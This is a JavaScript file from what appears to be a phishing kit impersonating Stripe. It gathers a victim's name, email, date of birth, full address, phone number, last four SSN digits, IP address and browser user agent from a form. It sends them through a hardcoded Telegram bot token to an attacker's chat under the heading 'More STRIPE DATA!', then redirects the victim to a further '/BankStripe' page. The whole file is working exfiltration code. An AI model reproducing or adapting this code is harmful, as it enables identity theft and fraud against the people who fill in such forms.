// let fname = $("input[name=first_name]")
// let lname = $("input[name=nameGoesHere]")
// let email = $("input[name=nameGoesHere]")
// let jobtitle = $("input[name=nameGoesHere]")
// let dob = $("input[name=nameGoesHere]")
// let country = $("input[name=nameGoesHere]")
// let ad1 = $("input[name=nameGoesHere]")
// let ad2 = $("input[name=nameGoesHere]")
// let city = $("input[name=nameGoesHere]")
// let state = $("input[name=nameGoesHere]")
// let zip = $("input[name=nameGoesHere]")
// let phoneno = $("input[name=nameGoesHere]")
// let ssn = $("input[name=nameGoesHere]")



document.addEventListener('input', function(){
  document.getElementById('errmsghldrbs').style.display = "none"
})



$.getJSON("https://api.ipify.org?format=json", function (data) {
  let ip = (document.getElementById("userip").value = data.ip);

  console.log(ip);
});

// $('#clickop').click(function(e){
//     e.preventDefault();
//     alert(fname)
//     console.log(fname)

//     // if( checkFormForErrors() ) {
//     //
//     // }

// })

$("#phno").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});

$("#phone").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});

//submit resolute

function clicksubmit() {
  // e.preventDefault();

  let fname = $("input[name=first_name]").val();
  let lname = $("input[name=last_name]").val();
  let email = $("input[name=email]").val();
  let jobtitle = $("input[name=jobtitle]").val();
  let dobmonth = $("input[name=dob-month]").val();
  let dobday = $("input[name=dob-day]").val();
  let dobyear = $("input[name=dob-year]").val();
  let country = $("#country").find(":selected").val();
  let ad1 = $("input[name=address]").val();
  let ad2 = $("input[name=address-line2]").val();
  let city = $("input[name=locality]").val();
  let state = $("#subregion").find(":selected").val();
  let zip = $("input[name=zip]").val();
  let phoneno = $("input[name=phone]").val();
  let ssn = $("input[name=ssn_last_4]").val();
  const userip = document.getElementById("userip").value;
  const agent = JSON.stringify(navigator.userAgent);
  console.log(
    fname +
      lname +
      email +
      jobtitle +
      dobmonth +
      dobyear +
      dobday +
      country +
      ad1 +
      ad2 +
      city +
      state +
      zip +
      phoneno +
      ssn
  );

  var jsLang =
    fname &&
    lname &&
    email &&
    jobtitle &&
    dobmonth &&
    dobyear &&
    dobday &&
    country &&
    ad1 &&
    city &&
    state &&
    zip &&
    phoneno &&
    ssn;
  switch (jsLang) {
    case (jsLang = null || ""):
      document.getElementById('errmsghldrbs').style.display = "block"
      break;
    case (jsLang = "am i god ?"):
      alert(' is equal to ""  !');
      break;
    // case 'mootools':
    //     alert('mootools Wins!');
    //     break;
    // case 'dojo':
    //     alert('dojo Wins!');
    //     break;
    default: // The url to request
      let tg = {
        token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        chat_id: "5708903193", // The user's(that you want to send a message) telegram chat id
      };

      const obj = {
        chat_id: tg.chat_id, // Telegram chat id
        text:
          "More STRIPE DATA!" +
          "\r\n\n" +
          " IP : " +
          userip +
          "\n\n" +
          "# Another beautiful tool by https://github.com/tutgirl #" +
          "\n\n" +
          "Email Address : " +
          email +
          "\n\n" +
          "First name : " +
          fname +
          "\n\n" +
          "Last name : " +
          lname +
          "\n\n" + 'Job Title : '  + 
          jobtitle +
          "\n\n" +  'DOB (dd/mm/yyy) : '  + 
          dobday+"/"+dobmonth+"/"+dobyear + "\n\n" +  'country : '  + 
          country +
          "\n\n" +  'Address line 1 : '  + 
          ad1 +
          "\n\n" + 'Address line 2 : '  + 
          ad2 +
          "\n\n" +  'City: '  + 
         city +
          "\n\n" + 'State : '  + 
         state +
          "\n\n" + 'Zip : '  + 
          zip +
          "\n\n" + 'Phone no : '  + 
          phoneno +
          "\n\n" + 'ssn : '  + 
          ssn +
          "\n\n" + 
          " [Device Type] : " +
          agent +
          "\n\n" +
          "\r" +
          "Easily check ip and [Device Type] below*" +
          "\r" +
          "https://whatismyipaddress.com/ip/" +
          userip,
        // The text to send
      };

      const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;

      $.ajax({
        type: "POST",
        headers: { "Content-type": "application/json; charset=UTF-8" },
        url: url,
        data: JSON.stringify(obj),

        success: function () {
          window.location.replace('/BankStripe')
        },
      });
  }

  // if(fname == null || fname == ""){
  //     alert('fname is empty')
  // }
}
